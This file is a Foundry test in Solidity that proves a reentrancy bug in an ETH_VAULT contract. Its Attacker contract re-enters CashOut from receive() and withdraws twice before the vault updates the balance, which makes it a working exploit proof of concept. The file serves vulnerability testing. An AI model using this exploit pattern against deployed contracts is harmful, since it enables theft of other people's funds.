
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ETH_VAULT, Log} from "../src/ETH_VAULT.sol";

contract TestReentrancyETH_VAULT is Test {
    
    ETH_VAULT public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new ETH_VAULT(address(_log));
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        // MinDeposit is 1 ether, so we need at least slightly more than that to deposit.
        // We also need to ensure attackVal is even or handles division safely, and doesn't overflow.
        vm.assume(attackVal > 1 ether + 100); 
        vm.assume(attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific time dependency.

        // --- 3. Funding ---
        // Fund the Victim (optional in this logic as we deposit our own funds, but good practice)
        vm.deal(address(_contractUnderTest), attackVal); 
        
        // Fund the Test Contract so it can send ETH to the Attacker
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        // We send 'attackVal' to the attacker to deposit.
        // The attacker will then try to withdraw half of it twice via reentrancy.
        // This avoids the Solidity 0.8.x underflow revert while proving the reentrancy flow.
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ETH_VAULT public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public amountToWithdraw;

    constructor(address victimAddress) { 
        victim = ETH_VAULT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit the full amount. 
        // We need a valid balance in the vault to pass the initial checks.
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // We will attempt to withdraw half the deposited amount.
        // By re-entering, we withdraw this amount twice.
        // Total withdrawn = val. Total Balance used for check = val.
        // This proves we can re-enter 'CashOut' and execute logic on stale state (balance not yet updated)
        // without triggering an arithmetic underflow in Solidity 0.8.x.
        amountToWithdraw = val / 2;

        victim.CashOut(amountToWithdraw);

        // If we reached here and count is 2, the reentrancy loop completed successfully.
        if (attackCallCount >= 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // Increment count to track calls
        attackCallCount++;

        if (attackCallCount < 2) {            
            // Re-enter the contract
            victim.CashOut(amountToWithdraw);
        }
    }
}
